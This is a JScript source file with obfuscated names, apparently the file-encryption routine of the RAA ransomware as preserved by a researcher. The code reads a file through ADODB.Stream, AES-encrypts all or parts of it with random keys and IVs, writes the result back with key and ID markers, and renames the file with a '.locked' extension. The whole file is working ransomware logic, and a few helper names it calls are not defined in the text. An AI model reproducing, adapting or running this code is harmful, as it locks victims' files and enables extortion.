/**
 * Created by bl4de on 27.07.2016.
 */
function KWgwJwOlqJcs(IMhTname) {

    function rStinsVp(rand) {
        var eqQu = [];
        var EPtLPmand = -1;
        do {
            EPtLPmand += 1;
            eqQu[EPtLPmand] = Math.floor((Math.random() * 2000) + 1);
            if (eqQu[EPtLPmand] < 10) {
                eqQu[EPtLPmand] = "000" + eqQu[EPtLPmand];
            } else if (eqQu[EPtLPmand] >= 10 && eqQu[EPtLPmand] < 100) {
                eqQu[EPtLPmand] = "00" + eqQu[EPtLPmand];
            } else if (eqQu[EPtLPmand] >= 100 && eqQu[EPtLPmand] < 1000) {
                eqQu[EPtLPmand] = "0" + eqQu[EPtLPmand];
            } else {
                eqQu[EPtLPmand] = eqQu[EPtLPmand];
            }
        } while (eqQu.length < 32);
        var xjLCtcIO = "";
        var EPtLPmand2 = -1;
        var vPdyagHuFMMj = [];
        do {
            EPtLPmand2 += 1;
            vPdyagHuFMMj[EPtLPmand2] = parseInt(eqQu[EPtLPmand2]);
            xjLCtcIO = xjLCtcIO + rand.charAt(vPdyagHuFMMj[EPtLPmand2]);
        } while (xjLCtcIO.length < 32);
        var gieJISwveNlD = [];
        gieJISwveNlD[0] = eqQu;
        gieJISwveNlD[1] = xjLCtcIO;
        return gieJISwveNlD;
    }

    var HZtSmFNRdJM_data = rStinsVp(VKw);

    var qPCIyff = rStinsVp(VKw);

////cWO7h7UOQEdvc9GiXfI7h2j00qzhHNh03qS4qJXfoQyWniUmqpKHaoPNTEYwSY3H2IVazY1nJbmfpKKyj9fNWAwPcrwVPxiE04yYjYwnxP
    function udpIHxNm(IMhTname) {
        var SlSPWu = WScript.CreateObject("ADODB.Stream");
        SlSPWu.CharSet = '437';
        SlSPWu.Open();
        SlSPWu.LoadFromFile(IMhTname);
        var hXpHGpZ = [];
        hXpHGpZ[0] = [];
        hXpHGpZ[1] = [];
        var PRuJZyAvfeza = SlSPWu.Size;
        if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
            var GinRqOjln = OQlYdejWlC(2000, 2040);
            hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
            var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
            hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
            hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
            var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
            hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
            hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
            SlSPWu.Close;
            jMvqmKSQu(hXpHGpZ);
        } else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
            qqJ(IMhTname)
        } else if (PRuJZyAvfeza <= 6122) {
            hXpHGpZ[0][0] = SlSPWu.ReadText;
            SlSPWu.Close;
            jMvqmKSQu(hXpHGpZ);
        } else {
            hXpHGpZ = 0;
            SlSPWu.Close;
            jMvqmKSQu(hXpHGpZ);
        }
        return 0;
    }

    udpIHxNm(IMhTname);
    function qqJ(IMhTname) {
        var SlSPWu = WScript.CreateObject("ADODB.Stream");
        SlSPWu.CharSet = '437';
        SlSPWu.Open();
        SlSPWu.LoadFromFile(IMhTname);
        var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
        FhDYKCTNZFu.CharSet = '437';
        FhDYKCTNZFu.Open();
        var GinRqOjln = OQlYdejWlC(90000, 125000);
        var PRuJZyAvfeza = SlSPWu.Size;
        var VVe = SlSPWu.ReadText(GinRqOjln);
        var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
        cBKyRXWGPWBs = String(cBKyRXWGPWBs);
        var rMkTeqZm = cBKyRXWGPWBs.length;
        SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
        var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
        var AblANuF = ukBnxEOtjm(ECgBWYtoib);
        AblANuF = String(AblANuF);
        var QfYmGGcYOFB = AblANuF.length;
        var IJDZ = ",";
        SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
        SlSPWu.SetEOS;
        SlSPWu.WriteText(cBKyRXWGPWBs);
        SlSPWu.WriteText(AblANuF);
        SlSPWu.WriteText(rMkTeqZm);
        SlSPWu.WriteText(IJDZ);
        SlSPWu.WriteText(QfYmGGcYOFB);
        SlSPWu.WriteText(IJDZ);
        var ids = "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
        SlSPWu.WriteText(ids);
        SlSPWu.Position = GinRqOjln;
        SlSPWu.CopyTo(FhDYKCTNZFu);
        SlSPWu.Close;
        FhDYKCTNZFu.SaveToFile(IMhTname, 2);
        FhDYKCTNZFu.Close;
        var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
        DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
        return 0;
    }

////jbnqLZNJJU8MXxfoAGPcb113j4K1XQ9IZWi4jg0f9sU3koQYuP0SF6ueN09SHxD8wbODMwlbiIkVALIpWt54jq6
    function jMvqmKSQu(hXpHGpZ) {
        if (hXpHGpZ[1].length != 0) {
            var DftonCbPCyQR = hXpHGpZ[0].join("");
            DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
            DftonCbPCyQR = DftonCbPCyQR + "=END=OF=HEADER=";
            DftonCbPCyQR = DftonCbPCyQR + hXpHGpZ[1].join("") + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=1";
            omaDplUyHou(DftonCbPCyQR);
        } else if (hXpHGpZ == 0) {
            var DftonCbPCyQR = 0;
            omaDplUyHou(DftonCbPCyQR);
        } else {
            var DftonCbPCyQR = hXpHGpZ[0][0];
            DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
            DftonCbPCyQR = DftonCbPCyQR + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=2";
            omaDplUyHou(DftonCbPCyQR);
        }
        return DftonCbPCyQR;
    }

    function ukBnxEOtjm(EQs) {
        var HZtSmFNRdJM = HZtSmFNRdJM_data[1];
        var gmCRXSMsLyM = qPCIyff[1];
        EQs = CryptoJS.AES.encrypt(EQs, HZtSmFNRdJM, {gmCRXSMsLyM: gmCRXSMsLyM});
        return EQs;
    }

    function omaDplUyHou(lsYZxzUm) {
        var IxC = new ActiveXObject('ADODB.Stream');
        IxC.Type = 2;
        IxC.Charset = "437";
        IxC.Open();
        if (lsYZxzUm != 0) {
            IxC.WriteText(lsYZxzUm);
            IxC.SaveToFile(IMhTname, 2);
            IxC.Close();
            var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
            DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
        } else {
            IxC.Close();
        }
        return 0;
    }

    return 0;
}